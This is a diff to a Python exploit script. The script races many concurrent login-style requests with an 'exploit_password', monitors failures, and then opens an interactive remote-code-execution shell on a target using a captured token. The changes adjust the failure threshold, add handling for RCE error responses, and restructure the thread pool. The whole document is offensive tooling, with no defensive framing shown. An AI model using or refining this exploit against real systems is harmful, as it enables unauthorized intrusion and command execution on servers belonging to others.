@@ -114,7 +114,7 @@ def monitor_threads(request_amount: int):
 
             print(f"\r\033[2K{status}", end="", flush=True)
 
-            if init_false > 250:
+            if init_false > 150:
                 MONITOR_STOP.set()
                 break
 
@@ -146,13 +146,19 @@ def interative(token: str, target: str, timeout: int):
             )
             rce_json = rce.json()
             output = rce_json.get("output", "")
+            is_error = rce_json.get("is_error", True)
             if rce.status_code == 401:
                 print("[!] Token expired.")
                 return
             elif rce.status_code == 500:
                 print("[!] Internal server error.")
+            elif rce.status_code == 200:
+                pass
             else:
                 print(f"[-] Unknown error: {rce.status_code}")
+
+            if is_error == True and hasattr(rce_json, "is_error"):
+                print(f"[-] Error: {output}")
 
             if output != "":
                 print(output)
@@ -240,19 +246,18 @@ def main(args):
     t = Thread(target=monitor_threads, daemon=True, args=(request_amount,))
     t.start()
     try:
-        with ThreadPoolExecutor(max_workers=concurrency) as pool:
-            try:
-                futures = [
-                    pool.submit(race_worker, exploit_password, timeout)
-                    for _ in range(request_amount)
-                ]
+        pool = ThreadPoolExecutor(max_workers=concurrency)
+        futures = [
+            pool.submit(race_worker, exploit_password, timeout)
+            for _ in range(request_amount)
+        ]
 
-                for future in as_completed(futures):
-                    thread_results.append(future.result())
-            except KeyboardInterrupt:
-                print("\n\n[*] Shutdown requested.")
-                MONITOR_STOP.set()
-                pool.shutdown(wait=False, cancel_futures=True)
+        for future in as_completed(futures):
+            thread_results.append(future.result())
+    except KeyboardInterrupt:
+        print("\n\n[*] Shutdown requested.")
+        MONITOR_STOP.set()
+        pool.shutdown(wait=False, cancel_futures=True)
 
     finally:
         pool.shutdown(wait=False, cancel_futures=True)
